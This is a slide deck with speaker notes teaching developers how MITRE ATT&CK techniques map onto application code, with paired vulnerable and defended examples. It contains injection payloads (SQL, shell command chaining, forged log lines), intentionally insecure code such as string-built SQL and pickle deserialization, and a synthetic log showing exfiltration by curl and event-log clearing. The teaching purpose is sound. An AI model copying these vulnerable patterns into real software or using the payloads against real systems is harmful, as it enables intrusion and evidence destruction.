<style>
section.compact-columns .columns {
  font-size: 0.9em;
  line-height: 1.3;
}
section.compact-columns .columns h3 {
  font-size: 1.08em;
  margin-top: 0;
  margin-bottom: 0.6em;
}
section.compact-columns .columns ul,
section.compact-columns .columns ol {
  margin: 0.4em 0;
}
section.compact-columns .columns li + li {
  margin-top: 0.25em;
}
section.compact-columns .columns blockquote {
  margin: 0.6em 0;
}
section.code-focus pre {
  font-size: 0.8em;
  line-height: 1.2;
  margin: 0.4em 0;
}
</style>

<style scoped>
section { color: #f4f9ff; }
h1, h2 { color: #f4f9ff; }
footer, footer a, section::after { color: #b9d9ef; }
</style>


<!-- _footer: 'https://github.com/codebytes/mitre-attack-for-devs' -->

# MITRE ATT&CK for Developers

## <!-- fit --> The Crooked Line: How Attackers Really Operate

## Chris Ayers

<!-- Attackers don't follow a straight line. They zigzag, backtrack, pivot, and adapt. This talk explores how the MITRE ATT&CK framework maps these crooked paths — and what developers can do to straighten out their defenses. The crooked-line metaphor frames the talk: defenders often expect a straight path, while attackers zigzag, backtrack, and pivot across tactics like reconnaissance, lateral movement, and exfiltration. -->

---


## Chris Ayers

### Principal Software Engineer<br>Azure EngOps AzRel<br>Microsoft

<i class="fa-brands fa-bluesky"></i> BlueSky: [@chris-ayers.com](https://bsky.app/profile/chris-ayers.com)
<i class="fa-brands fa-linkedin"></i> LinkedIn: [chris\-l\-ayers](https://linkedin.com/in/chris-l-ayers/)
<i class="fa fa-window-maximize"></i> Blog: [https://chris-ayers\.com/](https://chris-ayers.com/)
<i class="fa-brands fa-github"></i> GitHub: [Codebytes](https://github.com/codebytes)
<i class="fa-brands fa-mastodon"></i> Mastodon: [@Chrisayers@hachyderm.io](https://hachyderm.io/@Chrisayers)

<!-- Quick intro — I'm Chris, a Principal Software Engineer at Microsoft. I spend a lot of time thinking about how developers can build more secure applications without needing a PhD in cybersecurity. -->

---

## The Security Challenge

- **Growing attack surface**: APIs, microservices, cloud infrastructure
- **Sophisticated adversaries**: Nation-states, organized crime, insider threats
- **Complex attack chains**: Multiple techniques chained together
- **Traditional defenses**: Often focus on single points of failure
- **Goal today**: Protect identity, sessions, and data access

<!-- The attack surface has exploded. We're not just building monoliths anymore — we have APIs, microservices, serverless, and cloud infrastructure. And attackers don't just try one thing. They chain techniques together in complex kill chains. Our defenses need to evolve beyond "patch and pray." -->

---

## What is OWASP?

- **Open Web Application Security Project** - community-driven security standards
- **OWASP Top 10 2025**: Broken Access Control, Cryptographic Failures, Injection, etc.
- **Strengths**: Vulnerability classification, remediation guidance, prevention focus
- **Approach**: "Here's what can break in your application"

<!-- Most developers know OWASP. It's fantastic for understanding vulnerabilities — what can go wrong in your code. But it's fundamentally a prevention-focused, vulnerability-centric view. It answers "what's broken" but doesn't tell you much about who's attacking or how they actually behave. -->

---

## What is MITRE ATT&CK?

- **Origin**: MITRE Corporation, 2013, FMX (Fort Meade Experiment)
- **Purpose**: Knowledge base of adversary tactics, techniques, and procedures (TTPs)
- **Enterprise Matrix**: 14 tactics, 200+ techniques, 400+ sub-techniques
- **Real-world basis**: Derived from actual cyber attacks and threat intelligence
- **Approach**: "Here's how attackers actually operate"

<!-- MITRE ATT&CK flips the perspective. Instead of cataloging vulnerabilities, it catalogs attacker behavior. It started at Fort Meade when MITRE researchers studied real adversaries on a network. With over 200 techniques mapped from real-world attacks, it's the most comprehensive map of how hackers actually operate. -->

---

## MITRE Cybersecurity Ecosystem


<!-- ATT&CK isn't the only framework from MITRE. D3FEND maps defensive countermeasures, ATLAS covers AI/ML threats, and ENGAGE provides adversary engagement strategies. Together they form a comprehensive ecosystem. But ATT&CK is the foundation — and the most relevant for developers. -->

---

## ATT&CK Structure

- **Tactics**: The "why" of an attack (e.g., Initial Access, Persistence)
- **Techniques**: The "how" of an attack (e.g., Spear Phishing, Valid Accounts)
- **Sub-techniques**: Specific implementations (e.g., Spear Phishing via Email)
- **Procedures**: Real-world examples of technique usage by threat actors

<!-- Think of it as a hierarchy. Tactics are the goals — "I want to get initial access." Techniques are how — "I'll use spear phishing." Sub-techniques get specific — "I'll send a phishing email with a malicious attachment." And procedures are documented cases where real threat groups actually did this. -->

---

## The 14 ATT&CK Tactics


<!-- These are attacker goals, not a required sequence. The arrows organize this overview; real attacks loop back, skip steps, and adapt. Notice the groups: Pre-Attack for reconnaissance, Get In for initial compromise, Stay In for maintaining access, and Act for achieving objectives. Today we'll cover seven developer-focused areas: Initial Access, Execution, Persistence, Credential Access, Defense Evasion, Supply Chain, and Collection/Exfiltration. These are teaching groups, not seven official tactics: supply-chain compromise is a technique, and collection/exfiltration spans two tactics. Lateral Movement and Privilege Escalation often fall to infrastructure and platform teams — we'll touch on where they intersect with your code. -->

---

## OWASP vs ATT&CK

<div class="columns">
<div>

### OWASP
- **Focus**: Vulnerabilities
- **Perspective**: "What breaks"
- **Approach**: Prevention-first
- **Scope**: Application layer

</div>
<div>

### MITRE ATT&CK
- **Focus**: Adversary behavior
- **Perspective**: "What attackers do"
- **Approach**: Adversary-informed defense
- **Scope**: Full attack lifecycle

</div>
</div>

<!-- Side by side, you can see the difference. OWASP helps identify an injectable SQL query. ATT&CK helps describe how exploitation can lead to privilege escalation, lateral movement, and data theft. These are complementary perspectives, not an exclusive split between prevention and detection. ATT&CK is a knowledge base; our controls and telemetry perform the detection. -->

---

## Why not Both?


> "OWASP guides secure development. ATT&CK models adversary behavior."

- **Complementary approaches**: Prevention + Detection
- **Real-world attacks**: Use vulnerability chains, not single exploits
- **Defense in depth**: Multiple security perspectives
- **Broader coverage**: Vulnerabilities + adversary techniques

<!-- The setup IS the punchline: OWASP versus ATT&CK sounds like a choice — vulnerabilities or adversary behavior, prevention or detection. Real-world breaches are never a single vulnerability; they're chains of techniques. SolarWinds was supply chain compromise leading to lateral movement leading to data exfiltration. You need prevention AND detection to handle the full lifecycle. -->

---

## Mapping OWASP to ATT&CK

| OWASP Category | ATT&CK Techniques |
|----------------|------------------|
| Broken Access Control | T1078 (Valid Accounts), T1098 (Account Manipulation) |
| Injection | T1190 (Exploit Public-Facing App), T1059 (Command Injection) |
| Security Misconfiguration | T1552 (Unsecured Credentials), T1212 (Exploitation for Credential Access) |
| Cryptographic Failures | T1555 (Credentials from Password Stores) |
| Server-Side Request Forgery | T1090 (Proxy), T1572 (Protocol Tunneling) |

<!-- This mapping is incredibly useful. When you fix an OWASP vulnerability, you're actually blocking specific ATT&CK techniques. Fixing SQL injection doesn't just close a bug — it blocks T1190, which is the front door for dozens of attack chains. Understanding this connection helps you prioritize what to fix first. -->

---

# Let's Think Like Attackers

<!-- Now we shift gears. We're going to look at code through the eyes of an attacker and then see how to defend it. At each step, ask the same three questions: what can the attacker do, what can our application observe, and what decision should that signal trigger? -->

---

## The Kill Chain: Expectation vs Reality


<!-- This is the core insight of the talk. Defenders build straight-line defenses — firewall, IDS, patch management. But attackers zigzag, loop back, escalate, discover new targets, and escalate again. ATT&CK captures this messy reality that a linear kill chain model misses. -->

---

<!-- _class: compact-columns -->

## Real World: SolarWinds (2020)

<div class="columns">
<div>

### The Crooked Line in Action
1. 📦 **T1195.002** — Backdoor in signed update
2. ⚙️ **Execution** — Orion loads SUNBURST
3. 🔐 **T1606.002** — Forged SAML tokens
4. 🕸️ **T1071.004** — DNS signaling for C2
5. 📤 **T1041** — Data exfil over C2 channel

</div>
<div>

### Impact
- **Up to 18,000** customers received affected updates
- **9 months** undetected
- US Treasury, DHS, Fortune 500 breached

> Your **build pipeline** is an attack surface. Signed ≠ Safe.

</div>
</div>

<!-- SolarWinds illustrates why developers need ATT&CK. The build compromise placed malicious code in signed updates; a valid signature identifies the signer but does not prove safe behavior. These are examples from the broader campaign, not a mandatory sequence followed at every victim. Loading the SUNBURST DLL is execution, but is not by itself T1059, which specifically concerns command and scripting interpreters. SUNBURST used DNS signaling and subsequently HTTP communication. Golden SAML is token forgery (T1606.002), distinct from the prerequisite theft of a token-signing private key (T1552.004). Up to 18,000 customers received affected updates; that is not the number subjected to every follow-on technique. Sources: https://attack.mitre.org/software/S0559/ and https://attack.mitre.org/techniques/T1606/002/. -->

---

## Deployment Security Practices

| Area | Effective control | Common failure |
|---|---|---|
| Deployment | Policy checks + tested rollback | Checklist-only approval or unverified patches |
| Detection | Threat model + behavior baseline | Tickets without monitoring or follow-through |
| Access | Scoped permissions | Debug endpoints or world-writable files |

**ATT&CK lens:** 

- T1195 (Supply Chain)
- T1078 (Valid Accounts)
- T1505 (Server Software Component)

<!-- Process alone is not security. Enforced policy checks, a threat model, behavioral baselines, and tested recovery procedures provide evidence that a deployment is controlled. A green checklist or a filed ticket is not equivalent to a working control. Rushed patches, exposed debug endpoints, and overly broad file permissions can turn an initial compromise into persistent access. Apply the same scrutiny to build identities and delivery infrastructure as to application code. -->

---

# Initial Access & Credential Attacks

<!-- The attacker needs a first foothold, whether through a web vulnerability, stolen credentials, or phishing. Start with the trust boundary: which endpoints are exposed, which identities are accepted, and what signals would distinguish legitimate use from abuse? A valid login can bypass a perfectly patched endpoint. -->

---

## How Attackers Get In

| Technique ID | Name | Description |
|--------------|------|-------------|
| T1190 | Exploit Public-Facing Application | Web app vulnerabilities |
| T1078 | Valid Accounts | Compromised legitimate credentials |
| T1110 | Brute Force | Password spraying, credential stuffing |
| T1566 | Phishing | Social engineering for credentials |

<!-- These are the most common initial access techniques. T1190 is your classic web app exploit — SQL injection, XSS, etc. T1078 is even scarier — the attacker has real, valid credentials. Brute force and phishing are how they get those credentials in the first place. -->

---

## Make Access Decisions Explicit

**Validate identity, then authorize each protected operation.**

| Attacker move | Response | Who owns it |
|---|---|---|
| No valid token | **401** | Auth middleware |
| Repeated sign-in failures | **Throttle / challenge** | IdP + edge policy |
| Risky sign-in signal | **Apply risk policy** | Configured IdP |
| Valid token, wrong record | **404** | App authorization |
| Valid token, bulk export | **Step-up + limits** | App + IdP integration |
| Injected payload | **Safe APIs / reject** | App input handling |

<!-- Each protected operation needs an explicit response, but not every control is a new algorithm to write. Configure the identity provider's supported protections against credential attacks (T1110) and risky sign-ins; use authentication middleware to validate tokens. Availability, licensing, and enforcement behavior vary by product. Application policy still decides which records, tenants, and export volumes are permitted. For sensitive actions, the app requests and verifies the provider's supported step-up result before proceeding; a successful MFA challenge does not override authorization or volume limits. A concealed 404 is appropriate when resource existence should not be disclosed, not a universal replacement for 403. -->
---

<!-- _class: compact-columns -->

## Don't Rebuild Your Identity Provider

<div class="columns">
<div>

### 🪪 Configure supported IdP controls
- Credential-attack protection (T1110)
- MFA and sign-in risk policies
- Token lifetimes and revocation
- Risk events for connected apps

</div>
<div>

### 🧑‍💻 Own the application policy
- **Object + tenant authorization** (T1078)
- **App-session lifecycle + revocation**
- **Export limits** on your data (T1213)
- **Safe input handling** (T1059, T1190)
- **Business-meaningful audit events**

</div>
</div>

> Reuse supported protections. Test how your app enforces them.

<!-- Avoid rebuilding capabilities your identity provider already supports, but do not assume every product automatically supplies or enables every control. Provider risk models can combine signals across connected services; your app adds resource and business context. IP changes alone are not proof of compromise, especially for mobile users. Use framework and policy-engine support for authorization and sessions rather than hand-writing token or cookie cryptography. Your team still defines and integrates the object, tenant, export, and audit policies. IdP sign-out or refresh-token revocation does not necessarily invalidate an app's existing session or a self-contained access token immediately: test the supported revocation path and document its delay. Specialized custom detections can complement these protections; they should not replace well-supported defaults without a reason. -->
---

<!-- _class: code-focus -->

## Vulnerable Code: SQL Injection (T1190)

```python
# VULNERABLE - Direct string concatenation enables T1190
@app.route('/users')
def get_user():
    user_id = request.args.get('id')
    query = f"SELECT * FROM users WHERE id = {user_id}"
    cursor.execute(query)  # T1190: SQL Injection vulnerability
    return cursor.fetchall()

# Attack: /users?id=1 OR 1=1--
```

<!-- Classic SQL injection. The attacker passes "1 OR 1=1--" as the ID, which dumps the entire users table. This is the number one way attackers exploit public-facing applications. Simple string concatenation is all it takes to open the door. -->

---

<!-- _class: code-focus -->

## Defended Code: Parameterized Queries

```python
@app.route('/users')
def get_user():
    user_id = request.args.get('id', '')
    if not user_id.isdigit():
        return "Invalid input", 400
    query = "SELECT * FROM users WHERE id = ?"
    cursor.execute(query, (user_id,))
    user = cursor.fetchone()
    if user is None:
        return "User not found", 404
    return user
```

<!-- Parameter binding keeps the identifier separate from the SQL program, addressing this T1190 injection path. Validation also handles a missing or malformed id. A consistent 404 for missing records is useful API behavior, but does not by itself prevent T1087 account discovery; authorization, rate limits, and response design still matter. Authentication and record-level authorization are omitted from this query-focused excerpt. -->

---

<!-- _class: code-focus -->

## Valid Accounts: Your Half of T1078

**The token is real. The question is what it may touch.**

```csharp
var doc = await _documents.FindAsync(id);
if (doc is null) return NotFound();

var result = await _authz.AuthorizeAsync(User, doc, Operations.Read);
if (!result.Succeeded) {
    _logger.LogWarning("[T1078] denied sub={Sub} doc={Doc}", subject, id);
    return NotFound();   // same shape as a miss
}
return Ok(doc);
```

**A valid token does not grant access to every record.**

<!-- Scenario: an attacker with compromised valid credentials (T1078) probes records outside those credentials' authorization. Authentication middleware has already validated the principal; subject is taken from that principal, not a request header. Load the resource metadata, then ask the framework's authorization service to evaluate the app's tenant and object policy. [Authorize] alone cannot decide ownership of a resource that has not yet been loaded. Keep tenant isolation explicit even when roles or a policy service are used. The concealed 404 is an intentional policy here, so this response does not confirm whether an inaccessible id exists. Repeated denials are a signal to correlate, not automatic proof of an attack. Normal sharing can authorize a record owned by someone else; the relevant question is the policy, not ownership alone. -->

---

# Execution & Code Injection

<!-- Once attackers get in, they may try to execute code through the application. The next trust boundary is between user data and an interpreter. Watch what happens when a filename stops being data and becomes part of a shell program. -->

---

## How Attackers Run Code

| Technique ID | Name | Description |
|--------------|------|-------------|
| T1059 | Command & Scripting Interpreter | OS command injection |
| T1203 | Exploitation for Client Execution | Client-side code execution |
| T1055 | Process Injection | Injecting into legitimate processes |

<!-- Command injection is when user input ends up in an OS command. Exploitation for client execution targets the user's browser or client application. Process injection is more advanced — injecting code into running processes. As developers, we mostly encounter T1059. -->

---

## When Input Becomes a Command

```text
Developer: We validate filename length.
Attacker:  report.jpg; echo INJECTED
Shell:     That is a second command.
```

- User input became a command string
- The shell interpreted more than the app intended
- The blast radius is now the process identity

**ATT&CK lens:** T1059 — Command and Scripting Interpreter

<!-- The harmless echo illustrates a POSIX shell interpreting a second command. If untrusted input reaches a shell, the attacker gets a language runtime, not a filename parser. The impact is limited by the application's process identity and permissions, not the intended file-conversion operation. The next slide shows the same boundary failure with Windows cmd.exe syntax. -->
---

<!-- _class: code-focus -->

## Vulnerable Code: Command Injection (T1059)

```csharp
[HttpPost]
public IActionResult ProcessFile(string filename)
{
    var command = $"magick {filename} output.pdf";
    var process = Process.Start("cmd.exe", $"/c {command}");
    process.WaitForExit();
    return Ok("File processed");
}

// Harmless cmd.exe demo: file.jpg & echo INJECTED & rem
```

<!-- The filename goes directly into a Windows cmd.exe command. The ampersand separates commands; the harmless echo makes that visible without a destructive payload. The ImageMagick conversion is no longer the only operation the process runs. This is intentionally vulnerable code, not a command to run against a real service. -->

---

<!-- _class: code-focus -->

## Defended Code: Command Allowlisting

```csharp
if (!IsValidFilename(filename))
    return BadRequest("Invalid filename");
var start = new ProcessStartInfo("magick.exe") {
    UseShellExecute = false
};
start.ArgumentList.Add(filename);
start.ArgumentList.Add("output.pdf");
using var process = Process.Start(start)
    ?? throw new InvalidOperationException("Conversion did not start");
process.WaitForExit();
```

**Fixed executable. Separate arguments. No command shell.**

<!-- This is the process-launch excerpt inside the same controller action. ArgumentList replaces hand-built quoting; each value is an argument, not a shell program. IsValidFilename must constrain extensions and the upload directory and reject option-like names. Use a trusted executable path, least privilege, bounded runtime with child-process termination, and exit-code checking in the full implementation. The excerpt focuses on T1059's shell boundary, not every file-conversion risk. -->

---

<!-- _class: code-focus -->

## Unsafe Deserialization (CWE-502 / T1190)

```python
# VULNERABLE: pickle can invoke attacker-chosen callables
data = pickle.loads(request.data)

# DEFENDED: decode data, then validate its shape
try:
    data = json.loads(request.data)
except (json.JSONDecodeError, UnicodeDecodeError):
    return "Invalid JSON", 400
if not validate_schema(data):
    return "Invalid data format", 400
return process_object(data)
```

<!-- These are alternative bodies of the same HTTP handler, not code to run sequentially. Imports and framework setup are omitted. CWE-502 describes the weakness; exploiting this Internet-facing endpoint is a T1190 scenario. T1059.006 specifically means Python execution, not deserialization in every language, and T1203 concerns client execution. During pickling, __reduce__ can specify a callable and arguments; during unpickling, the reconstruction machinery invokes that callable. Validating the resulting object is too late. Use a data-only format, enforce a body-size limit before parsing, and validate allowed fields, types, ranges, and nesting before processing. The same class of unsafe object reconstruction occurs with unsafe YAML loaders, Java ObjectInputStream, PHP unserialize, and .NET BinaryFormatter. Sources: https://docs.python.org/3/library/pickle.html and https://attack.mitre.org/techniques/T1190/. -->

---

# Persistence & Session Hijacking

<!-- Attackers don't want to re-exploit every time. Once they have access, they look for a reusable identity or session. The question now changes from "is this token valid?" to "is it still being used by the expected client, and can we revoke it?" -->

---

## How Attackers Stay In

| Technique ID | Name | Description |
|--------------|------|-------------|
| T1098 | Account Manipulation | Modifying user accounts for persistence |
| T1539 | Steal Web Session Cookie | Obtaining an authenticated cookie |
| T1550.004 | Web Session Cookie | Replaying a stolen cookie |
| T1505.003 | Web Shell | Server-side persistence mechanisms |

<!-- These are related teaching examples, not a single ATT&CK tactic. T1098 changes accounts or permissions to maintain access. T1539 is cookie theft; T1550.004 is use of the stolen cookie to access an already-authenticated session. T1185 instead describes hijacking or pivoting through the victim's browser, so it is not a synonym for cookie replay. Web shells provide server-side persistence when attacker-controlled code is made executable by the server. Sources: https://attack.mitre.org/techniques/T1539/, https://attack.mitre.org/techniques/T1550/004/, and https://attack.mitre.org/techniques/T1185/. -->

---

<!-- _class: code-focus -->

## Vulnerable Session Management

```javascript
app.use(session({
    secret: 'hardcoded-secret',       // T1552
    resave: false, saveUninitialized: false,
    cookie: {
        secure: false, httpOnly: false,
        maxAge: 24 * 60 * 60 * 1000  // 24-hour window
    }
}));
app.get('/api/data', (req, res) => {
    if (req.session.user)
        return res.json(getData(req.session.user));
    res.status(401).send('Unauthorized');
});
```

<!-- The code shows a hardcoded signing secret (T1552), cookies that are not restricted to HTTPS or hidden from JavaScript, and a long opportunity for reuse of a stolen cookie (T1550.004). Cookie theft itself is T1539. Express sessions also depend on server-side state; knowing the signing secret does not reveal every session. The endpoint demonstrates authentication only, not complete record authorization. A stolen cookie can remain usable until expiration or effective revocation. -->

---

<!-- _class: code-focus -->

## Defended Session Management

```javascript
app.use(session({
    secret: process.env.SESSION_SECRET,
    store: sessionStore,
    resave: false, saveUninitialized: false,
    rolling: true, // Refresh expiry, not the session ID
    cookie: {
        secure: true, httpOnly: true, sameSite: 'strict',
        maxAge: 15 * 60 * 1000
    }
}));
```

- **Regenerate the ID** after login and privilege changes.
- **Revoke server-side**; short TTL is not revocation.

<!-- This configures an established session library rather than inventing a session manager. Validate that SESSION_SECRET is securely supplied at startup; sessionStore is an appropriately configured shared production store, not Express's default MemoryStore. Rolling refresh extends idle expiry, not the session identifier; use req.session.regenerate with error handling at authentication and privilege boundaries. Configure an absolute lifetime as well. Choose SameSite settings with the actual OIDC redirect and CSRF flow in mind; Strict is not a blanket setting for every authentication cookie. An IP change alone does not establish theft. Wire supported password-change, account-disable, privilege-change, and compromise responses to app-session invalidation. IdP revocation alone may not end this local session. Replaying a stolen cookie (T1550.004) can avoid repeating the original MFA challenge, so test effective revocation and any step-up requirements. These controls reduce risk; they do not guarantee prevention of every replay or browser compromise. -->

---

<!-- _class: code-focus -->

## Web Shells: Quarantine Uploads (T1505.003)

```csharp
if (file.Length is <= 0 or > 10 * 1024 * 1024)
    return BadRequest("File must be 1 byte to 10 MiB");
var ext = Path.GetExtension(file.FileName);
if (!_allowed.Contains(ext)) return BadRequest("Unsupported type");

var id = Guid.NewGuid().ToString("N");
var path = Path.Combine(quarantineRoot, id);
await using (var output = new FileStream(path, FileMode.CreateNew)) {
    await file.CopyToAsync(output, cancellationToken);
}
return Accepted(new { id, status = "pending_scan" });
```

**Private quarantine. Validate and scan before release.**

<!-- Authenticated, authorized upload-action excerpt; configure request-size limits and CSRF protection in the framework before accepting multipart data. _allowed is a case-insensitive extension allowlist. quarantineRoot is an application-configured private directory outside served content, with restricted ACLs and no web-server interpreter mappings; object storage is another option. The client never chooses the stored path, and the output stream is disposed before returning. Accepted means staged, not safe: persist pending state and let an isolated worker perform format-aware validation, malware scanning and, where appropriate, content disarm before an explicit release. Never serve pending or failed objects; clean up abandoned/partial uploads. Magic bytes alone are not full validation, and searching binary files for eval( is not malware detection. Removing Unix execute bits does not stop PHP or another interpreter from reading a file, and does not protect a vulnerable image/document parser. Content remains untrusted after storage. Authorize downloads and use attachment/nosniff headers as appropriate. Source: https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html. -->

---

# Credential Access & Secrets

<!-- Once an application is compromised, its credentials can extend the attack to other services. Developers often leave secrets in source, configuration, or environment variables. Reduce static secrets, scope workload permissions, and monitor credential use; moving a secret alone does not remove every way to steal it. -->

---

## How Attackers Steal Credentials

| Technique ID | Name | Description |
|--------------|------|-------------|
| T1552 | Unsecured Credentials | Hardcoded secrets, config files |
| T1555 | Credentials from Password Stores | Browser/app credential extraction |
| T1528 | Steal Application Access Token | API tokens, OAuth tokens |

<!-- T1552 is huge — hardcoded credentials in source code are found in almost every codebase audit. T1555 targets credential stores like browser password managers. T1528 is about stealing OAuth tokens and API keys from running applications. All three are preventable with proper secrets management. -->

---

## Secrets Management: A Choice


| ❌ Drake disapproves | ✅ Drake approves |
|---|---|
| `const apiKey = "sk-prod-...";` | `DefaultAzureCredential()` |
| `.env` committed to git | Managed Identity + Key Vault |
| Manual secret rotation | Scoped access + short-lived tokens |

**ATT&CK lens:** T1552 — Unsecured Credentials


<!-- The Drake comparison reinforces the same choice: credentials in code create T1552 exposure, while workload identity and scoped authorization reduce static secrets in the application path. RBAC controls what the identity can access; the identity provider issues the short-lived tokens. -->
---

<!-- _class: code-focus -->

## Bad Secrets Management - All Languages

```python
# Python: hardcoded credentials (dummy values)
DB_PASSWORD = "demo-password"
API_KEY = "demo-api-key"
```

```csharp
// C#: the same problem in static configuration
const string DbPassword = "demo-password";
const string ApiKey = "demo-api-key";
```

```javascript
// JavaScript: source-controlled configuration
const config = { dbPassword: "demo-password",
                 jwtSecret: "demo-signing-secret" };
```

<!-- These are deliberately fake values, showing the same T1552 exposure in all three languages. Credentials in connection strings, static fields, or configuration objects are still credentials in source. Removing them from the latest revision does not remove historical copies or revoke access. Rotate or revoke exposed credentials and use secret-scanning tools such as Gitleaks and TruffleHog. The full configuration boilerplate is not needed to recognize the pattern. -->

---

<!-- _class: code-focus -->

## Good Secrets Management - Python & C\#

```python
from azure.keyvault.secrets import SecretClient
from azure.identity import DefaultAzureCredential

client = SecretClient("https://myvault.vault.azure.net",
                      DefaultAzureCredential())
db_conn = client.get_secret("db-connection-string").value
```

```csharp
var client = new SecretClient(
    new Uri("https://myvault.vault.azure.net"),
    new DefaultAzureCredential());
var connStr = (await client.GetSecretAsync("db-connection")).Value.Value;
```

<!-- Workload identity removes the bootstrap credential from application code, reducing T1552 exposure; Key Vault stores a secret when the downstream service still needs one. DefaultAzureCredential can use developer credentials locally and managed identity in a configured Azure host. Provision the identity and grant narrowly scoped access, such as Key Vault Secrets User, separately. The code does not configure those permissions or rotate the database secret. Prefer direct identity-based access to the downstream service where supported. -->

---

## Automate Secret Detection (T1552 Prevention)

- **GitHub Secret Scanning** — automatically detects tokens, keys, and credentials in your repos
- **GitHub Push Protection** — blocks pushes containing secrets _before_ they reach the repo
- **Partner patterns** — 200+ token types from AWS, Azure, GCP, Stripe, npm, etc.
- **Custom patterns** — define regex for your own internal secrets
- **Pre-commit hooks** — tools like `gitleaks` and `trufflehog` catch secrets locally

> 💡 Enable **Secret Scanning** + **Push Protection** in your GitHub repo settings today. It's free for public repos.

<!-- Don't build your own scanner — use GitHub's built-in secret scanning. It covers 200+ partner patterns and blocks pushes before secrets ever hit version control. For private repos, GitHub Advanced Security adds custom patterns and organization-wide coverage. Combined with pre-commit hooks, you get defense in depth for credential leaks. -->

---

## I Used to Ship Secrets Like That

> "We'll remove the secret before production."
>
> Git history makes that promise too late.

| Before | After |
|---|---|
| Secrets in config | Secrets in vaults |
| Shared API keys | Scoped workload identities |
| Manual rotation | Short-lived tokens |
| "We'll clean git later" | Push protection blocks it now |

**ATT&CK lens:** T1552 — Unsecured Credentials

<!-- Secrets hygiene often becomes real only after an incident. Push protection, vault-backed runtime access, and scoped identities address the risk earlier. Deleting a secret from the latest revision does not revoke it or remove earlier copies: rotate or revoke first, then clean up exposure. -->
---

# Defense Evasion & Log Tampering

<!-- Once attackers are in, they don't want to be detected. They may tamper with logs, obfuscate their tools, or masquerade as legitimate processes. The next question is whether we can trust the evidence used to detect and investigate them. -->

---

## How Attackers Hide

| Technique ID | Name | Description |
|--------------|------|-------------|
| T1027 | Obfuscated Files/Information | Hiding malicious content |
| T1070 | Indicator Removal on Host | Log deletion/tampering |
| T1036 | Masquerading | Appearing legitimate |

<!-- T1027 is about hiding malicious payloads — encoding, encryption, packing. T1070 is log tampering — deleting or modifying logs to cover tracks. T1036 is masquerading — making malicious files look like legitimate system files. These techniques make forensic investigation extremely difficult. -->

---

## Living Off the Land: Correlate the Signals

```text
evidence.log

02:13:07  > powershell.exe spawned by svc_build
02:13:42  > curl POST 48 MB -> 185.220.x.x
02:18:55  > wevtutil cl Security; App; System

[!] alert correlation: ATTACK CHAIN DETECTED
```

**ATT&CK lens:** 
  - T1059 command execution
  - T1070 log tampering
  - T1071 C2

<!-- Individually, a shell, an HTTP transfer, and a maintenance command can look legitimate. Correlate the same process identity across this short time window before deciding to investigate or contain it. This synthetic evidence sequence is an illustration, not a ready-made detection rule; expected build behavior provides the baseline. -->
---

<!-- _class: code-focus -->

## Log Injection: Untrusted Labels (CWE-117)

```python
# VULNERABLE: a display label becomes part of the log format
label = request.json["export_name"]
logger.warning(f"Export denied: {label}")

# An attacker-controlled label:
# "Q3 report\n[INFO] Export approved by admin"
```

**A display label must not impersonate an audit event.**

<!-- This excerpt runs on an already-denied export request, not a homegrown login endpoint. In a line-oriented text log, the newline in the untrusted display label can impersonate a second event and mislead investigation. Parameterized message formatting alone does not necessarily escape those characters. Use a structured serializer and bounded, intentional fields instead of embedding arbitrary request text in the message. CWE-117 names this weakness; T1070 describes indicator removal, not every instance of forged log text. Logging integrity matters to investigating that broader defense-evasion behavior, but this example should not be labeled proof of T1070. -->

---

<!-- _class: code-focus -->

## Audit the Decision Your App Owns

```python
event = {
    "event": "export.denied",
    "tenant": identity.tenant_id,
    "subject": identity.subject_id,
    "resource": "customers",
    "operation": "export",
    "outcome": "denied",
    "reason": "row_budget",
    "request_id": request_id,
}
logger.warning(json.dumps(event))
```

**Correlatable app context. No tokens, passwords, or result rows.**

<!-- The IdP can report a sign-in; the application can explain which resource and operation were denied and why. identity is the validated authentication context, resource/operation/reason come from server-side policy, and request_id is a server-generated correlation identifier, not a session credential. Configure this audit logger with a message-only line formatter or an equivalent JSON sink; json.dumps escapes embedded control characters so one event remains one JSON record. A real sink should enforce field/size limits, access controls, and explicit delivery-failure handling. Join these events with IdP and platform telemetry; if tagging T1213 as a collection hypothesis, distinguish that analytic context from a confirmed attack. Exporting telemetry does not create cryptographic integrity or immutability. Remote storage, retention/deletion permissions, protected integrity evidence, and missing-event alerts are separate controls shown next. -->

---

## Preserve Evidence Outside the App



<!-- Application events go to a remote collector under a separate administrative boundary. A protected archive has an explicitly configured retention or write-once policy; the app identity cannot delete records or relax that policy. The SIEM correlates events with identity and endpoint evidence and alerts on missing delivery. Encryption protects confidentiality, not immutability. Cryptographic integrity, where required, needs a trusted verification mechanism and evidence anchored outside the compromised host. Neither an exporter nor a local hash chain makes the application unable to lie or omit an event; independent signals and gap detection remain necessary. -->

---

# Supply Chain Compromise

<!-- So far we've followed abuse through application features. Now change the entry point: what if malicious code arrives through something the build already trusts? SolarWinds, Shai-Hulud, and event-stream illustrate upstream compromise; Log4Shell illustrates a critical flaw in a trusted dependency. Keep those two failure modes distinct as we walk through the existing cases. -->

---

## How Attackers Poison Your Dependencies

| Technique ID | Name | Description |
|--------------|------|-------------|
| T1195 | Supply Chain Compromise | Compromising upstream dependencies |
| T1195.001 | Compromise Software Dependencies | Malicious packages |

<!-- T1195 is the broad category — any compromise of something upstream of you. T1195.001 specifically targets software dependencies — the npm packages, PyPI packages, and NuGet packages we all depend on. The average application has hundreds of dependencies, each one a potential attack vector. -->

---

<style scoped>
table { font-size: 0.75em; line-height: 1.25; table-layout: fixed; }
th, td { padding: 5px 8px; }
th:nth-child(1) { width: 16%; }
th:nth-child(2) { width: 7%; }
th:nth-child(3) { width: 50%; }
th:nth-child(4) { width: 27%; }
</style>

## The Supply-Chain Attack Arc

| Story | Year | Attack Pattern | Classification |
|-------|------|----------------|----------------|
| **event-stream** | 2018 | Maintainer handoff → poisoned `flatmap-stream` dependency | Supply-chain compromise |
| **SolarWinds** | 2020 | Build pipeline compromise by nation-state actors | Nation-state supply-chain |
| **Log4Shell** | 2021 | Critical RCE in a trusted, uncompromised library | ⚠️ Dependency-trust failure |
| **XZ Utils** | 2024 | Build pipeline compromise by nation-state actors | Nation-state supply-chain |
| **Shai-Hulud** | 2025 | Self-replicating npm worm via `postinstall` lifecycle hooks | Supply-chain compromise |
| **Notepad++** | 2025 | Update infrastructure hijacked → Chrysalis backdoor | Supply-chain compromise |
| **Axios** | 2026 | Hijacked publisher → RAT via `postinstall` hook | Supply-chain compromise |

